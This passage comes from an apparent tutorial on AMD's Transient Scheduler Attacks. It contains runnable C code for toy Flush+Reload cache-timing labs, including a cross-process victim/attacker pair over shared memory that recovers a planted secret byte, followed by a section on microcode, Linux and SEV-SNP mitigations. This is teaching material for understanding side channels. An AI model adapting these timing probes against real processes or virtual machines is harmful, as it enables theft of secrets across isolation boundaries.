<span class="pl-smi">uint32_t</span> <span class="pl-en">time_access</span>(<span class="pl-smi">int</span> <span class="pl-s1">idx</span>) {
    <span class="pl-smi">unsigned <span class="pl-smi">int</span></span> <span class="pl-s1">aux</span>;
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];

    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t1</span> <span class="pl-c1">=</span> <span class="pl-en">__rdtscp</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">aux</span>);
    (<span class="pl-smi">void</span>)<span class="pl-c1">*</span><span class="pl-s1">addr</span>;
    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t2</span> <span class="pl-c1">=</span> <span class="pl-en">__rdtscp</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">aux</span>);

    <span class="pl-k">return</span> (<span class="pl-smi">uint32_t</span>)(<span class="pl-s1">t2</span> <span class="pl-c1">-</span> <span class="pl-s1">t1</span>);
}

<span class="pl-smi">int</span> <span class="pl-en">main</span>(<span class="pl-smi">void</span>) {
    <span class="pl-c">// 1. Initialize array to force allocation</span>
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-s1">probe_array</span>[<span class="pl-s1">i</span>] <span class="pl-c1">=</span> <span class="pl-c1">1</span>;
    }

    <span class="pl-c">// Attacker chooses a hint. For simplicity we fix it.</span>
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">attacker_hint</span> <span class="pl-c1">=</span> <span class="pl-c1">0x10</span>;

    <span class="pl-c">// 2. Flush the probe_array from cache</span>
    <span class="pl-en">flush_probe_array</span>();

    <span class="pl-c">// 3. Trigger victim many times to strengthen the signal</span>
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">1000</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-en">victim_operation</span>(<span class="pl-s1">attacker_hint</span>);
    }

    <span class="pl-c">// 4. Measure timing for each possible index and find fastest</span>
    <span class="pl-smi">uint32_t</span> <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-c1">UINT_MAX</span>;
    <span class="pl-smi">int</span> <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-c1">-1</span>;

    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">idx</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">idx</span><span class="pl-c1">++</span>) {
        <span class="pl-smi">uint32_t</span> <span class="pl-s1">t</span> <span class="pl-c1">=</span> <span class="pl-en">time_access</span>(<span class="pl-s1">idx</span>);
        <span class="pl-k">if</span> (<span class="pl-s1">t</span> <span class="pl-c1">&lt;</span> <span class="pl-s1">best_time</span>) {
            <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-s1">t</span>;
            <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-s1">idx</span>;
        }
    }

    <span class="pl-en">printf</span>(<span class="pl-s">"Best index = %d (time = %u cycles)\\n"</span>, <span class="pl-s1">best_idx</span>, <span class="pl-s1">best_time</span>);

    <span class="pl-c">// Recover an approximation of the secret</span>
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">recovered</span> <span class="pl-c1">=</span> <span class="pl-s1">attacker_hint</span> ^ (<span class="pl-smi">uint8_t</span>)<span class="pl-s1">best_idx</span>;
    <span class="pl-en">printf</span>(<span class="pl-s">"Actual secret    = 0x%02x\\n"</span>, <span class="pl-s1">secret</span>);
    <span class="pl-en">printf</span>(<span class="pl-s">"Recovered secret = 0x%02x\\n"</span>, <span class="pl-s1">recovered</span>);

    <span class="pl-k">return</span> <span class="pl-c1">0</span>;
}</pre></div>
<p>What’s happening here:</p>
<ul>
<li>The victim repeatedly touches <code>probe_array[(attacker_hint ^ secret) * STRIDE]</code>,</li>
<li>That specific cache line becomes hot,</li>
<li>The attacker times every index and infers which is fastest,</li>
<li>From that <code>best_idx</code>, it guesses <code>secret ≈ attacker_hint ^ best_idx</code>.</li>
</ul>
<p>This is the <strong>same mental structure</strong> as real microarchitectural leaks: you never read the secret directly; you watch how <strong>transient microarchitectural state changes timing</strong>.</p>
<p>On a modern CPU, you may need to run it multiple times, average results, or tweak <code>PROBE_SIZE</code> / <code>STRIDE</code> to get a clear signal.</p>
<div class="markdown-heading"><h3 class="heading-element">4.2 Variant without <code>rdtsc</code>: using <code>clock_gettime</code>
</h3><a id="user-content-42-variant-without-rdtsc-using-clock_gettime" class="anchor" aria-label="Permalink: 4.2 Variant without rdtsc: using clock_gettime" href="#42-variant-without-rdtsc-using-clock_gettime"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>If you want a version that doesn’t rely on <code>rdtsc</code> (e.g., on some systems it may be restricted or noisy), here’s a variant using <code>clock_gettime</code> with <code>CLOCK_MONOTONIC_RAW</code>. It’s less precise but more portable.</p>
<div class="highlight highlight-source-c"><pre><span class="pl-c">// gcc -O2 -march=native -o tsa_toy_posix tsa_toy_posix.c</span>

<span class="pl-k">#define</span> <span class="pl-s1">_GNU_SOURCE</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdio.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdint.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;time.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;x86intrin.h&gt;</span>   <span class="pl-c">// for _mm_clflush</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;unistd.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;limits.h&gt;</span>

<span class="pl-k">#define</span> <span class="pl-c1">STRIDE</span> 4096
<span class="pl-k">#define</span> <span class="pl-c1">PROBE_SIZE</span> 256

<span class="pl-smi">uint8_t</span> <span class="pl-s1">probe_array</span>[<span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];
<span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-s1">secret</span> <span class="pl-c1">=</span> <span class="pl-c1">0x2A</span>;  <span class="pl-c">// 42 decimal</span>

<span class="pl-k">static</span> <span class="pl-k">inline</span> <span class="pl-smi">uint64_t</span> <span class="pl-en">nsec_now</span>(<span class="pl-smi">void</span>) {
    <span class="pl-k">struct</span> <span class="pl-smi">timespec</span> <span class="pl-s1">ts</span>;
    <span class="pl-en">clock_gettime</span>(<span class="pl-c1">CLOCK_MONOTONIC_RAW</span>, <span class="pl-c1">&amp;</span><span class="pl-s1">ts</span>);
    <span class="pl-k">return</span> (<span class="pl-smi">uint64_t</span>)<span class="pl-s1">ts</span>.<span class="pl-c1">tv_sec</span> <span class="pl-c1">*</span> <span class="pl-c1">1000000000ull</span> <span class="pl-c1">+</span> <span class="pl-s1">ts</span>.<span class="pl-c1">tv_nsec</span>;
}

<span class="pl-smi">void</span> <span class="pl-en">victim_operation</span>(<span class="pl-smi">uint8_t</span> <span class="pl-s1">attacker_hint</span>) {
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-s1">attacker_hint</span> ^ <span class="pl-s1">secret</span>;
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];
    <span class="pl-smi">uint8_t</span> <span class="pl-s1">value</span> <span class="pl-c1">=</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span>;
    __asm__ <span class="pl-k">volatile</span>(<span class="pl-s">""</span> :: <span class="pl-s">"r"</span>(<span class="pl-s1">value</span>) : <span class="pl-s">"memory"</span>);
}

<span class="pl-smi">void</span> <span class="pl-en">flush_probe_array</span>(<span class="pl-smi">void</span>) {
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-en">_mm_clflush</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">i</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>]);
    }
}

<span class="pl-smi">uint64_t</span> <span class="pl-en">time_access_ns</span>(<span class="pl-smi">int</span> <span class="pl-s1">idx</span>) {
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];

    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t1</span> <span class="pl-c1">=</span> <span class="pl-en">nsec_now</span>();
    (<span class="pl-smi">void</span>)<span class="pl-c1">*</span><span class="pl-s1">addr</span>;
    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t2</span> <span class="pl-c1">=</span> <span class="pl-en">nsec_now</span>();

    <span class="pl-k">return</span> <span class="pl-s1">t2</span> <span class="pl-c1">-</span> <span class="pl-s1">t1</span>;
}

<span class="pl-smi">int</span> <span class="pl-en">main</span>(<span class="pl-smi">void</span>) {
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-s1">probe_array</span>[<span class="pl-s1">i</span>] <span class="pl-c1">=</span> <span class="pl-c1">1</span>;
    }

    <span class="pl-smi">uint8_t</span> <span class="pl-s1">attacker_hint</span> <span class="pl-c1">=</span> <span class="pl-c1">0x05</span>;

    <span class="pl-c">// Simple multiple trials to average timing</span>
    <span class="pl-k">const</span> <span class="pl-smi">int</span> <span class="pl-s1">trials</span> <span class="pl-c1">=</span> <span class="pl-c1">50</span>;

    <span class="pl-c">// prime+victim</span>
    <span class="pl-en">flush_probe_array</span>();
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">1000</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-en">victim_operation</span>(<span class="pl-s1">attacker_hint</span>);
    }

    <span class="pl-smi">uint64_t</span> <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-c1">UINT64_MAX</span>;
    <span class="pl-smi">int</span> <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-c1">-1</span>;

    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">idx</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">idx</span><span class="pl-c1">++</span>) {
        <span class="pl-smi">uint64_t</span> <span class="pl-s1">total</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>;
        <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">t</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">t</span> <span class="pl-c1">&lt;</span> <span class="pl-s1">trials</span>; <span class="pl-s1">t</span><span class="pl-c1">++</span>) {
            <span class="pl-s1">total</span> <span class="pl-c1">+=</span> <span class="pl-en">time_access_ns</span>(<span class="pl-s1">idx</span>);
        }
        <span class="pl-smi">uint64_t</span> <span class="pl-s1">avg</span> <span class="pl-c1">=</span> <span class="pl-s1">total</span> / <span class="pl-s1">trials</span>;

        <span class="pl-k">if</span> (<span class="pl-s1">avg</span> <span class="pl-c1">&lt;</span> <span class="pl-s1">best_time</span>) {
            <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-s1">avg</span>;
            <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-s1">idx</span>;
        }
    }

    <span class="pl-en">printf</span>(<span class="pl-s">"Best index = %d (avg time = %llu ns)\\n"</span>,
           <span class="pl-s1">best_idx</span>, (<span class="pl-smi">unsigned long long</span>)<span class="pl-s1">best_time</span>);

    <span class="pl-smi">uint8_t</span> <span class="pl-s1">recovered</span> <span class="pl-c1">=</span> <span class="pl-s1">attacker_hint</span> ^ (<span class="pl-smi">uint8_t</span>)<span class="pl-s1">best_idx</span>;
    <span class="pl-en">printf</span>(<span class="pl-s">"Actual secret    = 0x%02x\\n"</span>, <span class="pl-s1">secret</span>);
    <span class="pl-en">printf</span>(<span class="pl-s">"Recovered secret = 0x%02x\\n"</span>, <span class="pl-s1">recovered</span>);

    <span class="pl-k">return</span> <span class="pl-c1">0</span>;
}</pre></div>
<p>This looks similar to the timing setups in CPU side-channel courses and Spectre labs, where you average many samples to separate cache hits from misses.</p>
<div class="markdown-heading"><h3 class="heading-element">4.3 Splitting victim and attacker (two processes, shared memory)</h3><a id="user-content-43-splitting-victim-and-attacker-two-processes-shared-memory" class="anchor" aria-label="Permalink: 4.3 Splitting victim and attacker (two processes, shared memory)" href="#43-splitting-victim-and-attacker-two-processes-shared-memory"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>To make the lab feel more like a <strong>cross-process leak</strong> (closer to TSA’s “other context” threat model), you can separate victim and attacker into <strong>two processes</strong> that share memory via <code>shm_open</code> / <code>mmap</code>.</p>
<p><strong>Shared header:</strong></p>
<div class="highlight highlight-source-c"><pre><span class="pl-c">// common.h</span>
<span class="pl-k">#pragma</span> once
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdint.h&gt;</span>

<span class="pl-k">#define</span> <span class="pl-c1">STRIDE</span> 4096
<span class="pl-k">#define</span> <span class="pl-c1">PROBE_SIZE</span> 256

<span class="pl-k">struct</span> <span class="pl-smi">shared_region</span> {
    <span class="pl-smi">uint8_t</span> <span class="pl-c1">probe_array</span>[<span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">stop</span>;      <span class="pl-c">// flag to tell victim to stop</span>
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">ready</span>;     <span class="pl-c">// flag for simple sync</span>
};</pre></div>
<p><strong>Victim process:</strong></p>
<div class="highlight highlight-source-c"><pre><span class="pl-c">// victim.c</span>
<span class="pl-c">// gcc -O2 -march=native -o victim victim.c -lrt</span>

<span class="pl-k">#include</span> <span class="pl-s">"common.h"</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;sys/mman.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;fcntl.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;unistd.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdio.h&gt;</span>

<span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-s1">secret</span> <span class="pl-c1">=</span> <span class="pl-c1">0x7F</span>;

<span class="pl-smi">int</span> <span class="pl-en">main</span>(<span class="pl-smi">void</span>) {
    <span class="pl-smi">int</span> <span class="pl-s1">fd</span> <span class="pl-c1">=</span> <span class="pl-en">shm_open</span>(<span class="pl-s">"/tsa_demo"</span>, <span class="pl-c1">O_RDWR</span> | <span class="pl-c1">O_CREAT</span>, <span class="pl-c1">0600</span>);
    <span class="pl-en">ftruncate</span>(<span class="pl-s1">fd</span>, <span class="pl-k">sizeof</span>(<span class="pl-k">struct</span> <span class="pl-smi">shared_region</span>));
    <span class="pl-k">struct</span> <span class="pl-smi">shared_region</span> <span class="pl-c1">*</span><span class="pl-s1">sh</span> <span class="pl-c1">=</span> <span class="pl-en">mmap</span>(<span class="pl-c1">NULL</span>, <span class="pl-k">sizeof</span>(<span class="pl-c1">*</span><span class="pl-s1">sh</span>),
                                    <span class="pl-c1">PROT_READ</span> | <span class="pl-c1">PROT_WRITE</span>,
                                    <span class="pl-c1">MAP_SHARED</span>, <span class="pl-s1">fd</span>, <span class="pl-c1">0</span>);

    <span class="pl-c">// Initialize</span>
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">probe_array</span>[<span class="pl-s1">i</span>] <span class="pl-c1">=</span> <span class="pl-c1">1</span>;
    }

    <span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">ready</span> <span class="pl-c1">=</span> <span class="pl-c1">1</span>;

    <span class="pl-k">while</span> (!<span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">stop</span>) {
        <span class="pl-c">// attacker_hint could be communicated via shared memory too;</span>
        <span class="pl-c">// here we just fix it for simplicity</span>
        <span class="pl-smi">uint8_t</span> <span class="pl-s1">attacker_hint</span> <span class="pl-c1">=</span> <span class="pl-c1">0x11</span>;
        <span class="pl-smi">uint8_t</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-s1">attacker_hint</span> ^ <span class="pl-s1">secret</span>;
        <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];
        <span class="pl-smi">uint8_t</span> <span class="pl-s1">value</span> <span class="pl-c1">=</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span>;
        __asm__ <span class="pl-k">volatile</span>(<span class="pl-s">""</span> :: <span class="pl-s">"r"</span>(<span class="pl-s1">value</span>) : <span class="pl-s">"memory"</span>);
    }

    <span class="pl-k">return</span> <span class="pl-c1">0</span>;
}</pre></div>
<p><strong>Attacker process:</strong></p>
<div class="highlight highlight-source-c"><pre><span class="pl-c">// attacker.c</span>
<span class="pl-c">// gcc -O2 -march=native -o attacker attacker.c -lrt</span>

<span class="pl-k">#include</span> <span class="pl-s">"common.h"</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;sys/mman.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;fcntl.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;unistd.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;x86intrin.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;stdio.h&gt;</span>
<span class="pl-k">#include</span> <span class="pl-s">&lt;limits.h&gt;</span>

<span class="pl-smi">uint32_t</span> <span class="pl-en">time_access</span>(<span class="pl-k">struct</span> <span class="pl-smi">shared_region</span> <span class="pl-c1">*</span><span class="pl-s1">sh</span>, <span class="pl-smi">int</span> <span class="pl-s1">idx</span>) {
    <span class="pl-smi">unsigned</span> <span class="pl-s1">aux</span>;
    <span class="pl-k">volatile</span> <span class="pl-smi">uint8_t</span> <span class="pl-c1">*</span><span class="pl-s1">addr</span> <span class="pl-c1">=</span> <span class="pl-c1">&amp;</span><span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">probe_array</span>[<span class="pl-s1">idx</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>];
    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t1</span> <span class="pl-c1">=</span> <span class="pl-en">__rdtscp</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">aux</span>);
    (<span class="pl-smi">void</span>)<span class="pl-c1">*</span><span class="pl-s1">addr</span>;
    <span class="pl-smi">uint64_t</span> <span class="pl-s1">t2</span> <span class="pl-c1">=</span> <span class="pl-en">__rdtscp</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">aux</span>);
    <span class="pl-k">return</span> (<span class="pl-smi">uint32_t</span>)(<span class="pl-s1">t2</span> <span class="pl-c1">-</span> <span class="pl-s1">t1</span>);
}

<span class="pl-smi">int</span> <span class="pl-en">main</span>(<span class="pl-smi">void</span>) {
    <span class="pl-smi">int</span> <span class="pl-s1">fd</span> <span class="pl-c1">=</span> <span class="pl-en">shm_open</span>(<span class="pl-s">"/tsa_demo"</span>, <span class="pl-c1">O_RDWR</span>, <span class="pl-c1">0600</span>);
    <span class="pl-k">struct</span> <span class="pl-smi">shared_region</span> <span class="pl-c1">*</span><span class="pl-s1">sh</span> <span class="pl-c1">=</span> <span class="pl-en">mmap</span>(<span class="pl-c1">NULL</span>, <span class="pl-k">sizeof</span>(<span class="pl-c1">*</span><span class="pl-s1">sh</span>),
                                    <span class="pl-c1">PROT_READ</span> | <span class="pl-c1">PROT_WRITE</span>,
                                    <span class="pl-c1">MAP_SHARED</span>, <span class="pl-s1">fd</span>, <span class="pl-c1">0</span>);

    <span class="pl-c">// Wait for victim to init</span>
    <span class="pl-k">while</span> (!<span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">ready</span>) { }

    <span class="pl-c">// Flush cache lines first</span>
    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">i</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">i</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">i</span><span class="pl-c1">++</span>) {
        <span class="pl-en">_mm_clflush</span>(<span class="pl-c1">&amp;</span><span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">probe_array</span>[<span class="pl-s1">i</span> <span class="pl-c1">*</span> <span class="pl-c1">STRIDE</span>]);
    }

    <span class="pl-c">// Give victim some time to run and "prime" one line</span>
    <span class="pl-en">usleep</span>(<span class="pl-c1">10000</span>);

    <span class="pl-smi">uint32_t</span> <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-c1">UINT_MAX</span>;
    <span class="pl-smi">int</span> <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-c1">-1</span>;

    <span class="pl-k">for</span> (<span class="pl-smi">int</span> <span class="pl-s1">idx</span> <span class="pl-c1">=</span> <span class="pl-c1">0</span>; <span class="pl-s1">idx</span> <span class="pl-c1">&lt;</span> <span class="pl-c1">PROBE_SIZE</span>; <span class="pl-s1">idx</span><span class="pl-c1">++</span>) {
        <span class="pl-smi">uint32_t</span> <span class="pl-s1">t</span> <span class="pl-c1">=</span> <span class="pl-en">time_access</span>(<span class="pl-s1">sh</span>, <span class="pl-s1">idx</span>);
        <span class="pl-k">if</span> (<span class="pl-s1">t</span> <span class="pl-c1">&lt;</span> <span class="pl-s1">best_time</span>) {
            <span class="pl-s1">best_time</span> <span class="pl-c1">=</span> <span class="pl-s1">t</span>;
            <span class="pl-s1">best_idx</span> <span class="pl-c1">=</span> <span class="pl-s1">idx</span>;
        }
    }

    <span class="pl-en">printf</span>(<span class="pl-s">"Best index (cross-proc) = %d, time = %u cycles\\n"</span>,
           <span class="pl-s1">best_idx</span>, <span class="pl-s1">best_time</span>);

    <span class="pl-c">// Tell victim to stop</span>
    <span class="pl-s1">sh</span><span class="pl-c1">-&gt;</span><span class="pl-c1">stop</span> <span class="pl-c1">=</span> <span class="pl-c1">1</span>;

    <span class="pl-k">return</span> <span class="pl-c1">0</span>;
}</pre></div>
<p>This is closer in spirit to <strong>“victim in one context, attacker in another”</strong>, even though they’re still on the same OS and sharing memory explicitly. Real TSA removes that explicit sharing: instead of a shared array, the “shared state” is the CPU’s internal scheduler, store queue, and L1 cache.</p>
<div class="markdown-heading"><h3 class="heading-element">4.4 Connecting the lab back to TSA</h3><a id="user-content-44-connecting-the-lab-back-to-tsa" class="anchor" aria-label="Permalink: 4.4 Connecting the lab back to TSA" href="#44-connecting-the-lab-back-to-tsa"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Right after these code sections, the key takeaway is:</p>
<ul>
<li>
<p>Our toy lab uses <strong>cache presence</strong> as the side-channel signal (classic Flush+Reload / Prime+Probe).</p>
</li>
<li>
<p>TSA uses <strong>scheduler timing</strong> as the side-channel signal:</p>
<ul>
<li>False completions → invalid data forwarded → different dependency chains → different timing.</li>
</ul>
</li>
<li>
<p>In both cases, the attacker:</p>
<ol>
<li>
<strong>Influences</strong> microarchitectural state (priming),</li>
<li>Lets a victim touch secret-dependent data (access pattern),</li>
<li>Measures a <strong>timing difference</strong> in its own code,</li>
<li>Reconstructs bits of the secret over many trials.</li>
</ol>
</li>
</ul>
<p>That’s the mental bridge you want readers to cross.</p>
<hr>
<div class="markdown-heading"><h2 class="heading-element">5. Mitigations: what AMD, OSs, and clouds are doing</h2><a id="user-content-5-mitigations-what-amd-oss-and-clouds-are-doing" class="anchor" aria-label="Permalink: 5. Mitigations: what AMD, OSs, and clouds are doing" href="#5-mitigations-what-amd-oss-and-clouds-are-doing"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>TSA mitigations span firmware, OS, and virtualization layers.</p>
<div class="markdown-heading"><h3 class="heading-element">5.1 Microcode + VERW</h3><a id="user-content-51-microcode--verw" class="anchor" aria-label="Permalink: 5.1 Microcode + VERW" href="#51-microcode--verw"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>AMD ships updated <strong>microcode</strong> for vulnerable Family 19h CPUs. On top of that, they recommend using the memory form of the <code>VERW</code> instruction as a “microarchitectural scrub”:</p>
<ul>
<li>New CPUID bits tell software:
<ul>
<li>Whether TSA-L1 / TSA-SQ are not present,</li>
<li>Whether the CPU supports TSA mitigation via <code>VERW_CLEAR</code>.</li>
</ul>
</li>
<li>With appropriate microcode loaded, <strong>CPL0 (kernel / hypervisor)</strong> can execute <code>VERW</code> to clear TSA-relevant structures when crossing trust boundaries, e.g.:
<ul>
<li>Kernel → user transitions,</li>
<li>Hypervisor → guest VM transitions,</li>
<li>Before entering low-power states.</li>
</ul>
</li>
</ul>
<p>This is similar in spirit to existing post-Spectre mitigations (IBPB, STIBP, etc.) but targeted at scheduler structures.</p>
<div class="markdown-heading"><h3 class="heading-element">5.2 Linux <code>MITIGATION_TSA</code> and <code>tsa=</code> knob</h3><a id="user-content-52-linux-mitigation_tsa-and-tsa-knob" class="anchor" aria-label="Permalink: 5.2 Linux MITIGATION_TSA and tsa= knob" href="#52-linux-mitigation_tsa-and-tsa-knob"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>Linux added explicit support for TSA mitigations:</p>
<ul>
<li>A new Kconfig option <code>MITIGATION_TSA</code> gates TSA-related logic.</li>
<li>A boot parameter <code>tsa=</code> controls behavior (e.g., always on, only for user/kernel transitions, only guest/host transitions, or disabled).</li>
<li>Combined with updated microcode from <code>linux-firmware</code>, this lets distros tune performance vs security trade-offs depending on threat model.</li>
</ul>
<div class="markdown-heading"><h3 class="heading-element">5.3 SEV-SNP and attestation</h3><a id="user-content-53-sev-snp-and-attestation" class="anchor" aria-label="Permalink: 5.3 SEV-SNP and attestation" href="#53-sev-snp-and-attestation"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>For AMD’s <strong>SEV-SNP</strong> (encrypted VM) environments:</p>
<ul>
<li>TSA could, in principle, allow a malicious hypervisor to infer SEV-SNP guest data.</li>
<li>Microcode and firmware updates aim to automatically mitigate TSA for SEV-SNP guests.</li>
<li>Guest owners are expected to:
<ul>
<li>Verify via <strong>attestation</strong> that the host is running the right microcode,</li>
<li>Confirm that TSA mitigations are active before trusting the platform.</li>
</ul>
</li>
</ul>
<hr>
<div class="markdown-heading"><h2 class="heading-element">6. What red teams and blue teams should actually do</h2><a id="user-content-6-what-red-teams-and-blue-teams-should-actually-do" class="anchor" aria-label="Permalink: 6. What red teams and blue teams should actually do" href="#6-what-red-teams-and-blue-teams-should-actually-do"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<div class="markdown-heading"><h3 class="heading-element">6.1 For red teams</h3><a id="user-content-61-for-red-teams" class="anchor" aria-label="Permalink: 6.1 For red teams" href="#61-for-red-teams"><span aria-hidden="true" class="octicon octicon-link"></span></a></div>
<p>TSA probably won’t be your <strong>first</strong> move in a real engagement, but it’s worth understanding as part of a modern attack surface:</p>
<ul>
<li>
<strong>Model it as a capability</strong>:
